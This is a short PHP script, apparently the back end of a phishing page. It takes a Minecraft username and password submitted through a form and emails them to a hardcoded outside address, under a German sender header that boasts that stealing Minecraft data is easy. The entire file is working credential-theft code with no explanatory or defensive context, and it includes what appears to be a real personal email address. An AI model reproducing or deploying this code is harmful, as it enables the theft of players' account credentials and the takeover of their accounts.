<?php

$McN = $_POST['mcn'];
$McPw = $_POST['mcpw'];

$to = 'tobivan.kenobi@web.de';
$subj = 'Minecraft Username und Passwort!!!';
$msg = 'Username: ' . $McN . '\nPw: ' . $McPw;
$from = "From: MinecraftDatenKlau.IstLeicht";

mail($to, $subj, $msg, $from);

?>